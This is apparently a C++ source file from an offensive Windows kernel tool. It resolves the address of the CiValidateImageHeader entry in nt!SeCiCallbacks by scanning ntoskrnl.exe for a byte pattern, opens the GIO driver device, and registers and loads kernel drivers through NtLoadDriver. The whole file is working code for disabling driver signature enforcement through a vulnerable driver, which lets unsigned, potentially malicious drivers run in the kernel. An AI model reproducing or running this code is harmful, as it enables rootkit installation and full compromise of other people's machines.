#include "includes.h"
#include "win_api_defs.h"

#define GIO_DEVICE_NAME				L"\\Device\\GIO"
PVOID GetProcessHeapFromPEB()
{
#ifdef _M_X64
    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readgsqword( 0x60 );
#else
    PPEB_CUSTOM pPeb = ( PPEB_CUSTOM )__readfsdword( 0x30 ); // For 32-bit
#endif
    return pPeb ? pPeb->ProcessHeap : nullptr;
}

static NTSTATUS modules::FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase )
{
    *ModuleBase = { 0 };

    ULONG size{ 0 };
    NTSTATUS stat;

    if ( ( stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, nullptr, 0, &size ) ) != STATUS_INFO_LENGTH_MISMATCH ) return 0;

    const PRTL_PROCESS_MODULES Modules = static_cast< PRTL_PROCESS_MODULES >( RtlAllocateHeap( GetProcessHeapFromPEB(), HEAP_ZERO_MEMORY, 2 * static_cast< SIZE_T >( size ) ) );

    stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, Modules, 2 * size, nullptr );

    if ( !NT_SUCCESS( stat ) ) goto Exit;

    for ( ULONG i = 0; i < Modules->NumberOfModules; ++i )
    {
        RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
        if ( _stricmp( ModuleName, reinterpret_cast< PCHAR >( Module.FullPathName ) + Module.OffsetToFileName ) == 0 )
        {
            *ModuleBase = reinterpret_cast< ULONG_PTR >( Module.ImageBase );
            stat = STATUS_SUCCESS;
            break;
        }
    }


Exit:
    RtlFreeHeap( GetProcessHeapFromPEB(), 0, Modules );
    return stat;
}

static ULONG_PTR modules::GetKernelModuleAddress( const char* name ) {
    DWORD size{ 0 };
    void* buf{ NULL };
    PRTL_PROCESS_MODULES mods;

    NTSTATUS stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buf, size, &size );

    while ( stat == STATUS_INFO_LENGTH_MISMATCH ) {
        VirtualFree( buf, 0, MEM_RELEASE );

        buf = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
        stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buf, size, &size );
    }

    if ( !NT_SUCCESS( stat ) ) VirtualFree( buf, 0, MEM_RELEASE ); return 0;

    mods = ( PRTL_PROCESS_MODULES )buf;

    for ( int i = 0; i < mods->NumberOfModules; i++ ) {
        char* current_name = ( char* )mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName;

        if ( !_stricmp( current_name, name ) ) {
            ULONG_PTR res = ( ULONG_PTR )mods->Modules[i].ImageBase;
            VirtualFree( buf, 0, MEM_RELEASE );
            return res;
        }
    }
    VirtualFree( buf, 0, MEM_RELEASE );
    return 0;

}

seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {

    std::wcout << ( "[*] Searching Pattern...\n" );

    ULONG_PTR mod_base = modules::GetKernelModuleAddress( "ntoskrnl.exe" );

    HMODULE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
    void* ntoskrnl_ptr = ( void* )usermode_load_va;

    //Calculating the size of the loaded module
    MODULEINFO modinfo;
    GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );

    // pattern: lea r8, [nt!SeCiCallbacks]
    static const unsigned char leaSeCiCallbacks[] = { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 };

    DWORD64 match = helpers::FindBytes64( uNtAddr, modinfo.SizeOfImage, leaSeCiCallbacks, sizeof( leaSeCiCallbacks ) );
    if ( !match )
    {
        wprintf( L"[!] Couldn't find lea r8, [nt!SeCiCallbacks]\n" );
        return { !STATUS_SUCCESS };
    }

    // +4 to land on the displacement field, exactly as in the original snippet
    DWORD64 seCiCallbacksInstr = match + 4;

    wprintf( L"[*] Instr: 0x%016llX\n", static_cast< unsigned long long >( seCiCallbacksInstr ) );
   
    DWORD32 seCiCallbacksLeaOffset = *( DWORD32* )( seCiCallbacksInstr + 3 );

    // The LEA instruction searched for does 32bit math, hence overflow into the more significant 32 bits must be prevented.
    DWORD32 seCiCallbacksInstrLow = ( DWORD32 )seCiCallbacksInstr;
    DWORD32 seCiCallbacksAddrLow = seCiCallbacksInstrLow + 3 + 4 + seCiCallbacksLeaOffset;
    
    // calc struct's address in usermode
    DWORD64 seCiCallbacksAddr = ( seCiCallbacksInstr & 0xFFFFFFFF00000000 ) + seCiCallbacksAddrLow;
    wprintf( L"[*] Usermode CiCallback: 0x%016llX\n", static_cast< unsigned long long >( seCiCallbacksAddr ) );
    
    // calc offset form base 
    DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
    wprintf( L"[*] Offset: 0x%016llX\n", static_cast< unsigned long long >( KernelOffset ) );
    
    DWORD64 kernelAddress = mod_base + KernelOffset;
    DWORD64 zwFlushInstructionCache = ( DWORD64 )GetProcAddress( usermode_load_va, "ZwFlushInstructionCache" ) - uNtAddr + ( DWORD64 )mod_base;
    
    // add hardcoded offset to the SeCiCallbacks struct to get to CiValidateImageHeader's entry 
    DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;

    return seCiCallbacks_swap{
        ciValidateImageHeaderEntry,
        zwFlushInstructionCache
    };

}

NTSTATUS modules::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors )
{
    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING( GIO_DEVICE_NAME );
    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &DeviceName, OBJ_CASE_INSENSITIVE );
    IO_STATUS_BLOCK IoStatusBlock;

    const NTSTATUS Status = NtCreateFile( DeviceHandle,
        SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
        &ObjectAttributes,
        &IoStatusBlock,
        nullptr,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        nullptr,
        0 );

    if ( !NT_SUCCESS( Status ) && PrintErrors ) // The first open is expected to fail; don't spam the user about it
        wprintf( L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status );

    return Status;
}


NTSTATUS modules::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
{
    helpers::FileNameToServiceName( ServiceName, FileName );
    NTSTATUS Status = RtlCreateRegistryKey( RTL_REGISTRY_ABSOLUTE, ServiceName );
    
    if ( !NT_SUCCESS( Status ) )    return Status;

    WCHAR NtPath[MAX_PATH];
    ULONG ServiceType = SERVICE_KERNEL_DRIVER;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"ImagePath", REG_SZ, NtPath, helpers::ConvertToNtPath( NtPath, FileName ) );
    
    if ( !NT_SUCCESS( Status ) )    return Status;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof( ServiceType ) );

    std::wprintf( L"[*] Service Created for %ws and File %ws\n", ServiceName, FileName );
    return Status;
}

int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) // TODO: holy shit this is fucking horrible
{
    wcscpy_s( Dst, sizeof( L"\\??\\" ) / sizeof( WCHAR ), L"\\??\\" );
    wcscat_s( Dst, ( MAX_PATH + sizeof( L"\\??\\" ) ) / sizeof( WCHAR ), Src );
    return static_cast< int >( wcslen( Dst ) ) * sizeof( wchar_t ) + sizeof( wchar_t );
}

void helpers::DeleteService( PWCHAR ServiceName )
{
    // TODO: shlwapi.dll? holy fuck this is horrible
    SHDeleteKeyW( HKEY_LOCAL_MACHINE, ServiceName + sizeof( NT_MACHINE ) / sizeof( WCHAR ) - 1 );
}



NTSTATUS modules::LoadDriver( PWCHAR ServiceName )
{
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtLoadDriver( &ServiceNameUcs );
}

NTSTATUS modules::UnloadDriver( PWCHAR ServiceName )
{
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtUnloadDriver( &ServiceNameUcs );
}